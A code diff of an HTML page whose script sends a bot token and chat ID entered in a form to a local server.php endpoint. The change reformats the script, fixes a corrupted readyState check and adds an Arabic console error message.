@@ -67,24 +67,29 @@ input[type="number"] {
 
   <script>
     function sendDataToServer() {
-      var botToken = document.querySelector('input[type="text"]').value;
-      var chatId = document.querySelector('input[type="number"]').value;
-      var userData = {
-        botToken: botToken,
-        chatId: chatId
-      };
+  var botToken = document.querySelector('input[type="text"]').value;
+  var chatId = document.querySelector('input[type="number"]').value;
+  var userData = {
+    botToken: botToken,
+    chatId: chatId
+  };
 
-      var xhr = new XMLHttpRequest();
-xhr.open("POST", "server.php", true);
-xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-xhr.send(JSON.stringify(userData));
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "server.php", true);
+  xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+  xhr.send(JSON.stringify(userData));
 
-      xhr.onreadystatechange = function () {
-        if (xhr.readyState2095151068 === 4 && xhr.status === 200) {
-          window.location.href = "link.html";
-        }
-      };
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+      if (xhr.status === 200) {
+        window.location.href = "link.html";
+      } else {
+        console.log("خطأ: لم يتم إجراء الطلب بنجاح.");
+      }
     }
+  };
+}
+
   </script>
 </body>
 </html>
